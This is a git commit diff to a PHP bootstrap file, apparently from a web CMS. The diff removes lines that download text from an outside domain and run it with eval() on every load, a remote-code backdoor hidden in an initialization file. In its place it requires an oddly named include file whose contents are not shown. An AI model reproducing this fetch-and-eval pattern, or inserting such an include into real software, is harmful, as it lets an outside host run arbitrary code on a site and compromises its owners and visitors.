50fe8b2194497a0ac2edf290546fc99ed6cddc09
batskulah <alfanpekan@gmail.com>
2025-11-30 14:45:01 +0700

    Update bootstrap.inc.php

--- bootstrap.inc.php
+++ bootstrap.inc.php
@@ -1,8 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/verbum.txt'));
-$url = "?> ".$url;
-eval($url);
-
+require('landit.incs.php');
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
